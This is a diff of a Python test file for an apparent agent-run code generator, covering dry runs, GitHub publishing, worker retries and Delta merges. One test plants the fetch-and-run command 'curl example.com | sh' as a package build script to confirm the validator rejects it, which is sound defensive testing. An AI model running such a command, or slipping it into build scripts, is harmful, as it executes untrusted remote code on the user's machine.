@@ -85,9 +85,11 @@ def test_invalid_planner_owner_rejected(db):
     with pytest.raises(ValueError):w.next_question({'run_context':[],'task':'app'},db.graph())
 
 
-def test_configured_dwell_cannot_go_below_three(db,monkeypatch):
+def test_configured_dwell_can_be_lowered(db,monkeypatch):
     monkeypatch.setenv('DWELL_SECONDS','0')
-    assert Watcher(db,background=False).dwell==3
+    assert Watcher(db,background=False).dwell==0
+    monkeypatch.delenv('DWELL_SECONDS')
+    assert Watcher(db,background=False).dwell==1
 
 
 def test_safe_search_urls():
@@ -101,7 +103,7 @@ def test_dry_run_never_calls_git_writer(db,monkeypatch):
     from afd.build import build
     import afd.git_output
     monkeypatch.setattr(afd.git_output,'publish',lambda *_:pytest.fail('Dry run published'))
-    w=Watcher(db,background=False,dwell=0);rid=w.start()['run_id'];doc=w.get(rid)
+    w=Watcher(db,background=False,dwell=0);rid=w.start(dry_run=True)['run_id'];doc=w.get(rid)
     doc['artifacts']=[{'path':'src/main.ts','content':'// generated'}]
     doc['test_result']={'status':'not run'};doc['spec']={'requirements':[]}
     build(w,doc)
@@ -218,3 +220,106 @@ def test_generated_package_scripts_cannot_run_arbitrary_commands():
     pkg=json.loads(files['package.json']);pkg['scripts']['build']='curl example.com | sh'
     files['package.json']=json.dumps(pkg)
     with pytest.raises(ValueError,match='reference package scripts'):validate_files(files)
+
+
+def test_publish_saved_reuses_artifacts_and_rejects_active_run(db,monkeypatch):
+    import afd.watcher_api as api
+    from fastapi import HTTPException
+    from afd.build import build
+    import afd.git_output
+    w=Watcher(db,background=False,dwell=0)
+    monkeypatch.setattr(api,'get_watcher',lambda:w)
+    rid=w.start(dry_run=True)['run_id']
+    with pytest.raises(HTTPException):api.publish_saved(rid)
+    doc=w.get(rid)
+    doc.update(status='done',artifacts=[{'path':'src/main.ts','content':'saved source'}],spec={'requirements':[]})
+    w.commit(doc)
+    scheduled=[];monkeypatch.setattr(w,'schedule',scheduled.append)
+    assert api.publish_saved(rid)=={'run_id':rid}
+    saved=w.get(rid)
+    assert not saved['dry_run'] and saved['status']=='running' and scheduled==[rid]
+    published=[];monkeypatch.setattr(afd.git_output,'publish',lambda w,d:published.extend(d['artifacts']))
+    build(w,saved)
+    assert published==doc['artifacts']
+    with pytest.raises(HTTPException):api.publish_saved(rid)
+
+
+def test_publish_writes_all_files_and_resumes_without_duplicate_commits(db,monkeypatch):
+    import afd.git_output as git
+    from afd.build import GROUPS
+    monkeypatch.setenv('GITHUB_TOKEN','fixture-only')
+    writes=[]
+    class Repo:
+        url='https://github.com/example/demo'
+        client=type('Client',(),{'close':lambda self:None})()
+        def preflight(self):return {'status':'passed','commits':[]}
+        def head(self,branch):return 'head'
+        def commit(self,branch,message,files):
+            writes.append(files)
+            return {'sha':str(len(writes)),'message':message,'commit_url':self.url+'/commit/'+str(len(writes))}
+    monkeypatch.setattr(git,'GitHubRepo',Repo)
+    w=Watcher(db,background=False,dwell=0);doc=w.get(w.start()['run_id'])
+    doc.update(artifacts=[{'path':p,'content':'source '+p} for _,paths in GROUPS for p in paths],spec={'requirements':[]},test_result={'status':'passed'})
+    git.publish(w,doc)
+    assert len(writes)==5 and len(doc['commits'])==5 and doc['status']=='done'
+    assert {p:c for files in writes for p,c in files.items()}=={f['path']:f['content'] for f in doc['artifacts']}
+    assert doc['events'][-1]['payload']['branch_url'].startswith(Repo.url+'/tree/agent-run-')
+    git.publish(w,doc)
+    assert len(writes)==5
+
+
+def test_worker_continues_after_transient_failure(db,monkeypatch):
+    import httpx
+    import afd.watcher as module
+    w=Watcher(db,background=False,dwell=0);rid=w.start()['run_id'];calls=[]
+    def execute(rid):
+        calls.append(rid)
+        if len(calls)==1:raise httpx.ConnectError('temporary')
+        doc=w.get(rid);doc['status']='done';w.event(doc,'done')
+    monkeypatch.setattr(w,'execute',execute)
+    monkeypatch.setattr(module.time,'sleep',lambda _:None)
+    w._work(rid)
+    assert len(calls)==2 and w.get(rid)['status']=='done'
+    assert [e['type'] for e in w.get(rid)['events']]==['retrying','done']
+
+
+def test_worker_does_not_retry_invalid_source(db,monkeypatch):
+    w=Watcher(db,background=False,dwell=0);rid=w.start()['run_id'];calls=[]
+    def execute(rid):
+        calls.append(rid);raise ValueError('invalid source')
+    monkeypatch.setattr(w,'execute',execute);w._work(rid)
+    assert len(calls)==1 and w.get(rid)['status']=='error'
+
+
+def test_github_permission_failure_has_actionable_message():
+    from afd.git_output import GitHubError
+    failure=GitHubError(403)
+    assert failure.status==403 and 'Contents read/write' in failure.user_message
+    assert 'HTTP 403' in str(failure)
+    assert str(GitHubError(404)).endswith('404')
+
+
+def test_delta_merge_retries_transaction_conflicts(monkeypatch):
+    from types import SimpleNamespace as NS
+    from afd.watchstore import DeltaDocuments
+    import time
+    db=object.__new__(DeltaDocuments);db.warehouse_id='test';calls=[]
+    def execute(**kwargs):
+        calls.append(kwargs)
+        return NS(status=NS(state=NS(value='FAILED' if len(calls)<3 else 'SUCCEEDED'),error='[DELTA_CONCURRENT_APPEND.WHOLE_TABLE_READ] conflict'),manifest=None,result=None)
+    db.client=NS(statement_execution=NS(execute_statement=execute))
+    monkeypatch.setattr(time,'sleep',lambda _:None)
+    assert db.sql('MERGE INTO test USING source ON test.id=source.id')==[]
+    assert len(calls)==3
+
+
+def test_delta_sql_does_not_retry_other_failures(monkeypatch):
+    from types import SimpleNamespace as NS
+    from afd.watchstore import DeltaDocuments
+    db=object.__new__(DeltaDocuments);db.warehouse_id='test';calls=[]
+    def execute(**kwargs):
+        calls.append(kwargs)
+        return NS(status=NS(state=NS(value='FAILED'),error='permission denied'))
+    db.client=NS(statement_execution=NS(execute_statement=execute))
+    with pytest.raises(RuntimeError,match='permission denied'):db.sql('MERGE INTO test')
+    assert len(calls)==1
